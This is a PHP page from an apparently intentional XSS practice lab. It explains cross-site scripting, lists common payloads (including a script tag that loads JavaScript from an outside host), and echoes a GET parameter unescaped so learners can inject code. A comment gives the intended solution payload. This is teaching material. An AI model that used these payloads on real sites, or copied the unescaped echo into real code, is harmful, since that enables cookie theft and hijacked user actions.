<?php
session_start();
?>

<!DOCTYPE html>
<html>
	<head>
		<title>ISIS Giraffe - XSS</title>
	</head>
	<body>
		<h2>Cross Site Scripting</h2>
		<div>
			<p>
			Cross Site Scripting (XSS) occurs when a site renders input
			provided to the site without filtering it for characters 
			which another user's browser may interpret as being valid site markup.</p>
			<p>
			Typically XSS is exploited by an attacker using a JavaScript payload
			to send themselves another user's cookie, submit actions on another
			user's behalf, or defacing pages.</p>
		</div>
		<div>
			<p>
			Here are some common XSS payloads:</p>
			<?php
			$payloads = array('<script>alert(0)</script>', '<script src=//africanchildren.biz/new_nyan.js></script>', 
				'<img src=x onerror=alert(0)> ', '<a onclick=alert()>A');
			foreach ($payloads as &$payload) {
				$payload = htmlentities($payload);
				echo("<code>".$payload."</code><br/>");
			}
			?>
		</div>
		<div>
			<p>
			Try landing some XSS on the input below. </p>

			<form method="GET">
				<input type="text" name="xss">
			</form >
			<?php
				if(isset($_GET['xss'])){
					echo('You entered:');
					echo($_GET['xss']);
					echo('<br/><br/>'.'If you\'re not sure why your XSS payload isn\'t working you should look at the page source. Usually you can see it with Ctrl+U');
				}
			?>

			<p>If you think you're good enough with XSS, try using the form above to change this cat image into a giraffe image.</p>
			<?php
			// <script>window.onload=function(){document.getElementById("cat").src="http://i.imgur.com/6K8O2w4.gif";}<%2Fscript>ssss
			?>
			<img width="200px" height="200px" id="cat" src="http://i.imgur.com/2IMozHO.jpg">
		</div>
	</body>
</html>